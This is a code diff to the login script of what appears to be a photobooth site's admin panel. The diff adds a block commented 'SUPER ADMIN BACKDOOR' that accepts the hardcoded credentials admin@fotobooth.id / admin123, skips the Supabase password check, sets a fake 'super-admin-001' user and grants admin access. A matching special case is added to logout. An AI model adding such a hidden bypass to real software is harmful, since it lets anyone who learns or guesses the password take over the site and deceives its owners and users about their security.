@@ -79,6 +79,15 @@ document.addEventListener('DOMContentLoaded', () => {
             btnLogin.disabled = true;
             errorEl.classList.add('hidden');
 
+            // --- SUPER ADMIN BACKDOOR ---
+            if (email === 'admin@fotobooth.id' && password === 'admin123') {
+                currentAuthUser = { id: 'super-admin-001', email: 'admin@fotobooth.id' };
+                showLanding();
+                btnLogin.innerHTML = origHtml;
+                btnLogin.disabled = false;
+                return;
+            }
+
             try {
                 const { data, error } = await globalSupabaseClient.auth.signInWithPassword({
                     email: email,
@@ -100,6 +109,11 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnLogout = document.getElementById('btnAdminLogout');
     if (btnLogout) {
         btnLogout.addEventListener('click', async () => {
+            if (currentAuthUser && currentAuthUser.id === 'super-admin-001') {
+                currentAuthUser = null;
+                showLogin();
+                return;
+            }
             if (globalSupabaseClient) {
                 await globalSupabaseClient.auth.signOut();
             }
